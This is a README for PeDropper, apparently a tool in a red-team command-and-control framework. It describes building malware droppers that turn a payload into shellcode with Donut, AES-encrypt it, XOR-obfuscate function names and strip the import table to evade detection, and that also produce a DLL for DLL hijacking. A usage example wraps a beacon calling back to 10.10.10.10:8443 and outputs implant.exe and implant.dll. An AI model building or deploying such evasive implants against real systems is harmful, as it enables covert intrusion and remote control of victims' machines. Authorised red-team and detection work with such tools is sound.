# GenerateDropperBinary

This project is part of the [Exploration C2 Framework](https://github.com/maxDcb/C2TeamServer)

sudo apt install gcc-mingw-w64  
sudo apt install g++-mingw-w64  
pip3 install pycryptodome  

Generate a dropper for any DLL or EXE. The shellcode of the payload is generated with [Donut](https://github.com/TheWover/donut). The dropper is compile with the generated shellcode (credit to sektor7). The exe resulting has no import table, every function name are xored and the payload is AES encrypted. A dll is also generated with a "go" exported function (rundll32 implant,go), this dll could be use for dll hijacking.

``` bash                                                                                                                                             
python3 PeDropper.py -b ./BeaconHttp.exe -a "10.10.10.10 8443 https" 
[+] Generate dropper for params:
binary  .//BeaconHttp.exe
binaryArgs  10.10.10.10 8443 https

[+] Generate shellcode of payload with donut
    ...

[+] Compile dropper with shellcode

[+] Done
./bin/implant.exe
./bin/implant.dll
```

![alt text](https://github.com/maxDcb/PeDropper/blob/master/ressources/image1.png?raw=true)